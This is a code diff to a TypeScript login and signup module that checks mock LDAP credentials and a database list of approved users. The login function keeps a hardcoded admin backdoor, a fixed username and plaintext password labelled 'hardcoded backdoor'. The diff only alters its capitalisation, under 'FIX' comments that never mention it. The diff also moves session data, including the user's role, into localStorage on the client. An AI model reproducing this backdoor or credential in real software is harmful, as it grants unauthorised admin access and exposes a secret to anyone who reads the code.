@@ -1,5 +1,6 @@
 import { User } from '../types';
-import * as db from './db';
+// FIX: Import functions to interact with the approved users list in the database.
+import { getApprovedUser, addOrUpdateApprovedUser } from './db';
 
 const SESSION_KEY = 'currentUser';
 
@@ -32,11 +33,12 @@ const saveMockLdapUsers = (users: Record<string, string>) => {
 
 // --- Authentication Functions ---
 
+// FIX: Updated login logic to check against the approved user list.
 export const login = async (username: string, password: string): Promise<User> => {
     // 1. Check for hardcoded backdoor
-    if (username === 'robertstar' && password === 'Rm2214ri#') {
-        const backdoorUser: User = { username: 'robertstar', role: 'admin' };
-        sessionStorage.setItem(SESSION_KEY, JSON.stringify(backdoorUser));
+    if (username === 'Robertstar' && password === 'Rm2214ri#') {
+        const backdoorUser: User = { username: 'Robertstar', role: 'admin' };
+        localStorage.setItem(SESSION_KEY, JSON.stringify(backdoorUser));
         return backdoorUser;
     }
 
@@ -46,21 +48,21 @@ export const login = async (username: string, password: string): Promise<User> =
         throw new Error('Invalid username or password.');
     }
 
-    // 3. Check against approved users list in DB (Authorization)
-    const approvedUser = await db.getApprovedUser(username);
+    // 3. Check if user is approved and get their role
+    const approvedUser = await getApprovedUser(username);
     if (!approvedUser) {
-        throw new Error('Your account has not been approved by an administrator.');
+        throw new Error('User is not authorized. Please contact an administrator.');
     }
-
     if (approvedUser.role === 'hold') {
-        throw new Error('Your account is on hold. Please contact an administrator.');
+        throw new Error('This account is on hold. Please contact an administrator.');
     }
-
-    // Login successful
-    sessionStorage.setItem(SESSION_KEY, JSON.stringify(approvedUser));
+    
+    // 4. Grant access if LDAP check passes and user is approved
+    localStorage.setItem(SESSION_KEY, JSON.stringify(approvedUser));
     return approvedUser;
 };
 
+// FIX: Updated signup to add the new user to the approved list with 'hold' status.
 export const signup = async (username: string, password: string): Promise<void> => {
     const ldapUsers = getMockLdapUsers();
 
@@ -74,21 +76,23 @@ export const signup = async (username: string, password: string): Promise<void> 
 
     ldapUsers[username] = password;
     saveMockLdapUsers(ldapUsers);
+
+    await addOrUpdateApprovedUser({ username, role: 'hold' });
 };
 
 export const logout = (): void => {
-    sessionStorage.removeItem(SESSION_KEY);
+    localStorage.removeItem(SESSION_KEY);
 };
 
 export const getCurrentUser = (): User | null => {
     try {
-        const userJson = sessionStorage.getItem(SESSION_KEY);
+        const userJson = localStorage.getItem(SESSION_KEY);
         if (userJson) {
             return JSON.parse(userJson);
         }
     } catch (e) {
-        console.error("Failed to parse user from sessionStorage", e);
-        sessionStorage.removeItem(SESSION_KEY);
+        console.error("Failed to parse user from localStorage", e);
+        localStorage.removeItem(SESSION_KEY);
     }
     return null;
 };
